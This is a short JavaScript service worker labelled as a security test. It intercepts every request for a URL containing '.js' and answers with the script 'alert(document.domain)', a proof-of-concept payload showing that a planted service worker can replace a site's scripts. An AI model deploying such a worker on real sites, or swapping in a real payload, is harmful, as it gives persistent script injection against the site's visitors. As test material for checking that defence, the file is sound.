// security test

self.addEventListener("fetch", async (event) => {
    const request = event.request

    if (request.url.includes(".js")) {
        const injectedPathResponseOptions = {
            headers: {
                "content-type": "text/javascript"
            }
        }

        event.respondWith(new Response("alert(document.domain)", injectedPathResponseOptions))
    }

})